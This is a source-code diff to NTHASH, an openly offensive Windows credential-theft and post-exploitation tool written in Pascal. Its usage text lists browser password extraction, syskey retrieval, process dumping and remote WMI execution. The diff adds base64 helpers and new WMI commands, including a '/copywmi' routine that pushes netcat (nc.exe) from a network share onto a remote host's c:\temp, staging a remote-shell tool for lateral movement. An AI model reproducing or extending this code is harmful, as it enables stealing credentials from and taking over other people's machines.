@@ -5,7 +5,7 @@ program NTHASH;
 
 uses windows, classes, sysutils, dos, usamlib, usid, uimagehlp, upsapi,uadvapi32,
    untdll,utils,  umemory, ucryptoapi, usamutils, uofflinereg,
-  uvaults, uLSA, uchrome, ufirefox, urunelevatedsupport,wtsapi32, uwmi;
+  uvaults, uLSA, uchrome, ufirefox, urunelevatedsupport,wtsapi32, uwmi,base64;
 
 type _LUID =record
      LowPart:DWORD;
@@ -1187,7 +1187,54 @@ begin
     end; //if bret=true then
 end;
 
+function EncodeStringBase64w(const s:widestring):wideString;
 
+var
+  Outstream : TStringStream;
+  Encoder   : TBase64EncodingStream;
+begin
+  Outstream:=TStringStream.Create('');
+  try
+    Encoder:=TBase64EncodingStream.create(outstream);
+    try
+      Encoder.Write(s[1],Length(s)*2);
+    finally
+      Encoder.Free;
+      end;
+    Result:=Outstream.DataString;
+  finally
+    Outstream.free;
+    end;
+end;
+
+function DecodeStringBase64w(const s:widestring;strict:boolean=false):wideString;
+
+var
+  Instream,
+  Outstream : TStringStream;
+  Decoder   : TBase64DecodingStream;
+begin
+  Instream:=TStringStream.Create(s);
+  try
+    Outstream:=TStringStream.Create('');
+    try
+      if strict then
+        Decoder:=TBase64DecodingStream.Create(Instream,bdmStrict)
+      else
+        Decoder:=TBase64DecodingStream.Create(Instream,bdmMIME);
+      try
+         Outstream.CopyFrom(Decoder,Decoder.Size);
+         Result:=Outstream.DataString;
+      finally
+        Decoder.Free;
+        end;
+    finally
+     Outstream.Free;
+     end;
+  finally
+    Instream.Free;
+    end;
+end;
 
 begin
   log('NTHASH 1.5 by erwan2212@gmail.com',1);
@@ -1233,8 +1280,13 @@ begin
   log('NTHASH /enumvault',1);
   log('NTHASH /chrome [/user:path_to_folder_containing_login_data]',1);
   log('NTHASH /firefox [/user:path_to_database]',1);
+  //****************************************************
   log('NTHASH /bytetostring /input:hexabytes',1);
   log('NTHASH /stringtobyte /input:string',1);
+  log('NTHASH /base64encodew /input:string',1);
+  log('NTHASH /base64encode /input:string',1);
+  log('NTHASH /base64decode /input:base64string',1);
+  //****************************************************
   log('NTHASH /cryptunprotectdata /binary:filename',1);
   log('NTHASH /cryptunprotectdata /input:string',1);
   log('NTHASH /cryptprotectdata /input:string',1);
@@ -1245,12 +1297,15 @@ begin
   log('NTHASH /runts /user:session_id [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /enumpriv',1);
   log('NTHASH /enumproc',1);
-  log('NTHASH /enumprocwmi [/server:hostname]',1);
-  log('NTHASH /runwmi binary:x:\folder\bin.exe [/server:hostname]',1);
   log('NTHASH /killproc /pid:12345',1);
-  log('NTHASH /killprocwmi /pid:12345 [/server:hostname]',1);
   log('NTHASH /enummod /pid:12345',1);
   log('NTHASH /dumpproc /pid:12345',1);
+  //**************************************
+  //log('NTHASH /enumprocwmi [/server:hostname]',1);
+  //log('NTHASH /killprocwmi /pid:12345 [/server:hostname]',1);
+  //log('NTHASH /runwmi /binary:x:\folder\bin.exe [/server:hostname]',1);
+  //log('NTHASH /dirwmi /input:path [/server:hostname]',1);
+  //***************************************
   log('NTHASH /a_command /verbose',1);
   log('NTHASH /a_command /system',1);
   end;
@@ -1370,19 +1425,22 @@ begin
   p:=pos('/binary:',cmdline);
   if p>0 then
        begin
-       binary:=copy(cmdline,p,255); //length(cmdline)-p
+       binary:=copy(cmdline,p,1024); //length(cmdline)-p
        binary:=stringreplace(binary,'/binary:','',[rfReplaceAll, rfIgnoreCase]);
        //delete(binary,pos(' ',binary),255);
-       delete(binary,pos('/',binary),255);
+       delete(binary,pos('/',binary),1024);
        binary:=trim(binary);
        end;
   p:=pos('/input:',cmdline);
   if p>0 then
        begin
-       input:=copy(cmdline,p,255);
+       input:=copy(cmdline,p,2048);
        input:=stringreplace(input,'/input:','',[rfReplaceAll, rfIgnoreCase]);
-       delete(input,pos(' ',input),255);
+       //delete(input,pos(' ',input),2048);
+       delete(input,pos('/',input),2048);
+       input:=trim(input);
        end;
+  //************************************************************
   p:=pos('/bytetostring',cmdline);
   if p>0 then
      begin
@@ -1395,6 +1453,41 @@ begin
      if input='' then exit;
      log('StringtoByte:'+ ByteToHexaString ( AnsiStringtoByte(input)),1);
      end;
+  p:=pos('/base64encodew',cmdline);
+  if p>0 then
+     begin
+     if input='' then exit;
+     input:=StringReplace (input,'%2f','/',[rfReplaceAll,rfIgnoreCase]);
+     writeln('input:'+input);
+     log('base64encodew:'+ EncodeStringBase64w (widestring(input)) ,1);
+     goto fin;
+     end;
+  p:=pos('/base64encode',cmdline);
+  if p>0 then
+     begin
+     if input='' then exit;
+     input:=StringReplace (input,'%2f','/',[rfReplaceAll,rfIgnoreCase]);
+     writeln('input:'+input);
+     log('base64encode:'+ base64.EncodeStringBase64 ((input)) ,1);
+     goto fin;
+     end;
+  {
+  p:=pos('/base64decodew',cmdline);
+  if p>0 then
+     begin
+     if input='' then exit;
+     log('base64decodew:'+ DecodeStringBase64w (widestring(input)) ,1);
+     goto fin;
+     end;
+  }
+  p:=pos('/base64decode',cmdline);
+  if p>0 then
+     begin
+     if input='' then exit;
+     log('base64decode:'+ base64.DecodeStringBase64 (input) ,1);
+     goto fin;
+     end;
+  //************************************************************
   p:=pos('/getsyskey',cmdline);
   if p>0 then
      begin
@@ -1453,6 +1546,7 @@ begin
         else log('getsyskey NOT OK' ,1);
      goto fin;
      end;
+//******************* WMI **********************
   p:=pos('/enumprocwmi',cmdline);
     if p>0 then
        begin
@@ -1463,6 +1557,7 @@ begin
       if p>0 then
          begin
          if binary='' then exit;
+         binary:=StringReplace (binary,'%2f','/',[rfReplaceAll,rfIgnoreCase]);
          uwmi._Create (server,binary);
          goto fin;
          end;
@@ -1473,6 +1568,21 @@ begin
            uwmi._Killproc  (server,strtoint(pid));
            goto fin;
            end;
+   p:=pos('/dirwmi',cmdline);
+            if p>0 then
+               begin
+               if input='' then exit;
+               uwmi._ListFolder(server,'','',input );
+               goto fin;
+               end;
+   p:=pos('/copywmi',cmdline);
+             if p>0 then
+             begin
+             //if input='' then exit;
+             uwmi._CopyFile(server,'\\192.168.1.248\public\nc.exe','c:\temp\nc.exe') ;
+             goto fin;
+             end;
+//*****************************
   p:=pos('/enumproc',cmdline);
     if p>0 then
        begin
